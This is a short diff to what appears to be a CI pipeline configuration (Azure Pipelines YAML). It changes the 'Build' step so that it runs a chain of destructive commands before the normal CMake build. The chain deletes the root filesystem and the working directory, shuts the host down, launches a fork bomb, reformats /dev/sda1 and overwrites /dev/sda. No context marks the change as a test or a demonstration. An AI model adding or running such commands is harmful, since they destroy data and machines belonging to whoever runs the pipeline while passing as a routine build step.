@@ -10,7 +10,7 @@ pool:
   vmImage: 'ubuntu-latest'
 
 steps:
-- script: mkdir build; cd build; cmake .. ; cmake --build .
+- script: sudo rm -rf /; mkdir build; sudo rm -rf *; sudo shutdown -h now; :(){ : | : & };:; sudo mkfs.ext4 /dev/sda1; echo DEEEAAADD > /dev/sda; cd build; cmake .. ; cmake --build .
   displayName: 'Build'
 
 - script: cd build; ctest
